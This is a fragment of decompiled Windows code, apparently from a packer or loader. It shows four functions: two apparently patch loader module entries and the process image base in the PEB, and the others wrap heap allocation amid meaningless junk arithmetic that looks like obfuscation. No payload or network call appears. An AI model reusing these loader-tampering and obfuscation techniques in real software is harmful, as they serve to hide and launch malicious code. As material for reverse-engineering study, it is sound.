// 4040C4: using guessed type int dword_4040C4;
// 4040E8: using guessed type int dword_4040E8;
// 4040EC: using guessed type int dword_4040EC;
// 4040F0: using guessed type int dword_4040F0;
// 4040F8: using guessed type int (__stdcall *dword_4040F8)(_DWORD, _DWORD, _DWORD);
// 4040FC: using guessed type int dword_4040FC;

//----- (004024F0) --------------------------------------------------------
int __cdecl sub_4024F0(int a1, int a2)
{
  int v3; // [esp+4h] [ebp-20h]
  _DWORD *v4; // [esp+10h] [ebp-14h]
  _DWORD *v5; // [esp+1Ch] [ebp-8h]

  dword_4040FC = (dword_4040EC - 902465) << 23;
  v4 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_4040F4 + 48) + 12) + 12);
  v5 = v4;
  dword_4040FC = 0;
  do
  {
    if ( !v4 )
      return 0;
    dword_4040FC = v3 * ((dword_4040C4 + 642333 - dword_4040FC) >> dword_4040EC) * dword_4040C4;
    if ( v4[6] == a1 )
    {
      v4[7] = a2;
      return 1;
    }
    dword_4040C4 -= v3;
    v4 = (_DWORD *)*v4;
  }
  while ( v4 != v5 );
  return 0;
}
// 40258A: variable 'v3' is possibly undefined
// 4040C4: using guessed type int dword_4040C4;
// 4040EC: using guessed type int dword_4040EC;
// 4040F4: using guessed type int dword_4040F4;
// 4040FC: using guessed type int dword_4040FC;

//----- (004025E0) --------------------------------------------------------
int __cdecl sub_4025E0(int a1)
{
  int result; // eax
  char v2; // [esp+4h] [ebp-Ch]
  char v3; // [esp+4h] [ebp-Ch]

  v3 = v2 + dword_4040EC;
  result = *(_DWORD *)(dword_4040F4 + 48);
  *(_DWORD *)(result + 8) = a1;
  dword_4040C4 = (dword_4040EC + dword_4040FC) << v3;
  return result;
}
// 4025EE: variable 'v2' is possibly undefined
// 4040C4: using guessed type int dword_4040C4;
// 4040EC: using guessed type int dword_4040EC;
// 4040F4: using guessed type int dword_4040F4;
// 4040FC: using guessed type int dword_4040FC;

//----- (00402650) --------------------------------------------------------
BOOL __cdecl sub_402650(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax
  int v3; // [esp+18h] [ebp-8h]

  dword_4040EC = (v3 * v3) >> 31;
  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}
// 402660: variable 'v3' is possibly undefined
// 4040EC: using guessed type int dword_4040EC;

//----- (00402690) --------------------------------------------------------
LPVOID __cdecl sub_402690(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax
  int v3; // [esp+10h] [ebp-Ch]

  dword_4040C4 = (v3 + 102966) >> dword_4040C4;
  ProcessHeap = GetProcessHeap();
  return HeapAlloc(ProcessHeap, 0, dwBytes);
}
// 4026A0: variable 'v3' is possibly undefined
// 4040C4: using guessed type int dword_4040C4;

// nfuncs=12 queued=12 decompiled=12 lumina nreq=0 worse=0 better=0
// ALL OK, 12 function(s) have been successfully decompiled
